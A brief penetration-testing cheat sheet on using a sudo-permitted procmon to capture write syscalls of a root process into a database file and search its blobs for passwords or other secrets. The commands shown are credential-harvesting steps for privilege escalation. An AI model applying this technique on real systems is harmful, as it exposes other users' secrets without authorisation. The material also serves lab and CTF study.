# Procmon Privilege Escalation

### Main usage: Read root processes that they may contain sensitive data like passwords, etc.

### STEPS:

#### 1) Fetch the PID of the target process

    ps aux | grep TARGET_SCRIPT.sh 

#### 2) Write output in a .db file using procmon as sudo

    sudo /usr/bin/procmon -p PID -c output.db -e write 

#### 3) Transfer the file to our machine

#### 4) Open the .db file with a db browser or similar

    sqlitebrowser output.db 

#### 5) Go to -> Browse Data -> Duration (Filter > 9000000 or similar)

#### 6) Check the blobs 1 by 1. Here we can reveal potential sensitive data.
